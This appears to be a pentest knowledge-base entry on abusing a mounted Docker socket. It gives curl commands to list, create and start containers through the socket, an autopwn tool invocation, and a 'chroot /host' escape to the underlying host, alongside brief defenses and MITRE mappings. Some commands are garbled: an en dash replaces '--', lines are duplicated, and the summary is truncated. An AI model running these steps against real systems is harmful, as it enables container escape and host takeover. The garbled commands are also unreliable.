---
id: 2dbe4175-dbd9-4439-a333-4b08eb9fc76a
name: Mounted Docker Socket Pentest
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:16.928260+00:00'
updated_at: '2023-04-10T20:33:49.692989+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Container Administration Command|T1609 - Container Administration Command]]'
- '[[Modify Cloud Compute Infrastructure|T1578 - Modify Cloud Compute Infrastructure]]'
sub_techniques:
- '[[Create Cloud Instance|T1578.002 - Create Cloud Instance]]'
- '[[Create Snapshot|T1578.001 - Create Snapshot]]'
tags:
- '[[Container - Docker Pentest]]'
- '[[Mounted Docker Socket]]'
commands:
- '[[Check Docker Socket]]'
- '[[Create a new container]]'
- '[[Escape to host]]'
- '[[Hunt dem Socks]]'
- '[[List all containers]]'
- '[[Start the newly created container]]'
---

# Mounted Docker Socket Pentest

## Summary

The Mounted Docker Socket Pentest is a procedure that aims to test the security of Docker containers that have a mounted Docker socket. The procedure involves accessing the Docker socket and using it to manage Docker containers. This procedure is commonly used by attackers who have already gained a

## Description

# Description

The Mounted Docker Socket Pentest is a procedure that aims to test the security of Docker containers that have a mounted Docker socket. The procedure involves accessing the Docker socket and using it to manage Docker containers. This procedure is commonly used by attackers who have already gained a foothold in a system and are looking to escalate their privileges and move laterally within the network.

From a technical perspective, this procedure involves using the Docker API to interact with the Docker daemon and manage Docker containers. Attackers can use this access to execute commands on the host system and potentially gain root privileges. From a business perspective, this procedure can help organizations identify vulnerabilities in their Docker container deployment and improve their overall security posture.


 

## Requirements

1. Access to a system with a mounted Docker socket

1. Authentication credentials for the Docker API

1. Tools such as nmap, Metasploit, and Docker

 

## Defense

1. Restrict access to the Docker socket to trusted users only

1. Use container orchestration tools that do not require direct access to the Docker socket

1. Monitor Docker daemon logs for suspicious activity

 

## Objectives

1. Identify vulnerabilities in Docker container deployment

1. Test the security of mounted Docker sockets

1. Assess the effectiveness of current security measures

1. Identify potential privilege escalation opportunities

 

# Instructions

1. To use Docker commands, you need to have access to the Docker daemon. This is typically achieved via the Docker socket, which is a Unix socket that Docker listens to by default. The Docker socket path is the location of this Unix socket on your system.

 



**Code**: [[/var/run/docker.sock]]



> When you run a Docker command, the Docker client sends a request to the Docker daemon to carry out that command. The Docker daemon is responsible for managing Docker images, containers, networks, and volumes. By default, the Docker client communicates with the Docker daemon via the Docker socket, which is a Unix socket located at /var/run/docker.sock. This socket allows the Docker client and daemon to communicate with each other and carry out Docker commands. If you want to run Docker commands on your system, you'll need to have access to this socket. By default, Docker grants access to the socket to the root user and to any users in the docker group. If you're not in the docker group, you'll need to use sudo to run Docker commands.



**Command** ([[Check Docker Socket]]):

```bash
/var/run/docker.sock
```



2. This command is used to manage Docker containers. The first command lists all the running containers on the host. The second command creates a new container with the specified image (in this case, nginx). The third command starts the container with the ID obtained from the previous command.

 



**Code**: [[curl --unix-socket /var/run/docker.sock http://127]]



> The first command, 'curl --unix-socket /var/run/docker.sock http://127.0.0.1/containers/json', lists all the running containers on the host. The second command, 'curl -XPOST –unix-socket /var/run/docker.sock -d '{"Image":"nginx"}' -H 'Content-Type: application/json' http://localhost/containers/create', creates a new container with the specified image (in this case, nginx). The third command, 'curl -XPOST –unix-socket /var/run/docker.sock http://localhost/containers/ID_FROM_PREVIOUS_COMMAND/start', starts the container with the ID obtained from the previous command.



**Command** ([[List all containers]]):

```bash
curl --unix-socket /var/run/docker.sock http://127.0.0.1/containers/json
```





**Command** ([[Create a new container]]):

```bash
curl -XPOST –unix-socket /var/run/docker.sock -d '{"Image":"nginx"}' -H 'Content-Type: application/json' http://localhost/containers/create
```





**Command** ([[Start the newly created container]]):

```bash
curl -XPOST –unix-socket /var/run/docker.sock http://localhost/containers/ID_FROM_PREVIOUS_COMMAND/start
```



3. To use this command, navigate to the directory where `ed_linux_amd64` is located and run the command `./ed_linux_amd64 -path=/var/run/ -autopwn=true`. This will hunt down UNIX domain sockets from `/var/run/` and attempt to autopwn them. If a valid Docker socket is found, it will attempt to escape to the host in TTY mode.

 



**Code**: [[root@37bb034797d1:/tmp# ./ed_linux_amd64 -path=/va]]



> - `./ed_linux_amd64`: The command to run the `ed` exploit.
- `-path=/var/run/`: Specifies the path to search for UNIX domain sockets.
- `-autopwn=true`: Enables autopwning of any valid sockets found.
- `chroot /host && clear`: Changes the root directory to `/host` and clears the terminal.
- `echo 'You are now on the underlying host'`: Prints a message indicating that the user is now on the underlying host.
- `id`: Displays the user and group information for the current user.



**Command** ([[Hunt dem Socks]]):

```bash
./ed_linux_amd64 -path=/var/run/ -autopwn=true
```





**Command** ([[Escape to host]]):

```bash
chroot /host && clear
echo 'You are now on the underlying host'
chroot /host && clear
echo 'You are now on the underlying host'

```



## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[Container Administration Command|T1609 - Container Administration Command]]
- [[Modify Cloud Compute Infrastructure|T1578 - Modify Cloud Compute Infrastructure]]

### Sub-Techniques

- [[Create Cloud Instance|T1578.002 - Create Cloud Instance]]
- [[Create Snapshot|T1578.001 - Create Snapshot]]

## Commands Used

- [[Check Docker Socket]]
- [[Create a new container]]
- [[Escape to host]]
- [[Hunt dem Socks]]
- [[List all containers]]
- [[Start the newly created container]]

## Tags

- [[Container - Docker Pentest]]
- [[Mounted Docker Socket]]


